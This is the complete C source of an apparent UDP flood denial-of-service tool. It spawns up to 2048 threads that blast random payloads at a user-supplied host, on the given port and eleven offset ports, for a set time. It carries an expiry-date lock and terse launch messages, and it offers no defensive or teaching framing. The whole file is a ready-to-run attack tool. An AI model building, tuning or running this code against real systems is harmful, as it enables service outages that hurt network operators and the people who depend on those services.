#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/resource.h>

#define EYR 2029
#define EMN 1
#define EDY 10
#define MAXTH 2048

typedef struct {
    char ip[16];
    short pt;
    int dur, sz;
} pkt;

volatile int active = 1;

void handler(int sig) { active = 0; }

unsigned char gen_pkt(unsigned char *buf, int len) {
    static unsigned int seed = 0xCAFEBABE;
    for(int i = 0; i < len; i++) {
        seed = (seed * 1664525 + 1013904223) & 0xFFFFFFFF;
        buf[i] = (seed >> 24) & 0xFF;
    }
    return 1;
}

void *sender(void *data) {
    pkt *p = (pkt*)data;
    int fd;
    
    while(active) {
        fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(fd > 0) {
            struct sockaddr_in dest;
            dest.sin_family = AF_INET;
            dest.sin_port = htons(p->pt);
            dest.sin_addr.s_addr = inet_addr(p->ip);
            
            char payload[8192];
            gen_pkt(payload, p->sz);
            
            time_t deadline = time(NULL) + p->dur;
            while(time(NULL) < deadline && active) {
                sendto(fd, payload, p->sz, MSG_DONTWAIT, (struct sockaddr*)&dest, sizeof(dest));
            }
            close(fd);
        }
    }
    return NULL;
}

int main(int c, char **v) {
    struct rlimit lim = {MAXTH, MAXTH};
    setrlimit(RLIMIT_NPROC, &lim);
    
    signal(SIGINT, handler);
    
    time_t tnow;
    time(&tnow);
    struct tm *tm = localtime(&tnow);
    
    if(tm->tm_year + 1900 > EYR ||
       (tm->tm_year + 1900 == EYR && (tm->tm_mon + 1 > EMN ||
       (tm->tm_mon + 1 == EMN && tm->tm_mday > EDY)))) {
        puts("Expired");
        return 1;
    }
    
    puts("Init");
    
    if(c < 4) {
        printf("Use: %s <host> <port> <time> [size] [threads]\n", v[0]);
        return 1;
    }
    
    char host[16];
    strncpy(host, v[1], 15);
    host[15] = 0;
    
    int port = atoi(v[2]);
    int time_sec = atoi(v[3]);
    int pkt_size = (c > 4 ? atoi(v[4]) : 1400);
    int num_threads = (c > 5 ? atoi(v[5]) : MAXTH);
    
    pthread_t tids[MAXTH];
    pkt config[MAXTH];
    
    int variations[12] = {0,1,-1,10,-10,100,-100,50,-50,200,-200,0};
    
    int launched = 0;
    for(int var = 0; var < 12 && launched < num_threads; var++) {
        for(int th = 0; th < num_threads/12 && launched < MAXTH; th++) {
            strncpy(config[launched].ip, host, 15);
            config[launched].ip[15] = 0;
            config[launched].pt = port + variations[var];
            config[launched].dur = time_sec;
            config[launched].sz = pkt_size;
            
            pthread_create(&tids[launched], NULL, sender, &config[launched]);
            launched++;
        }
    }
    
    printf("Launch: %s:%d +12 vars = %d tasks\n", host, port, launched);
    
    sleep(time_sec + 10);
    active = 0;
    
    for(int i = 0; i < launched; i++) {
        pthread_join(tids[i], NULL);
    }
    
    puts("Complete");
    return 0;
}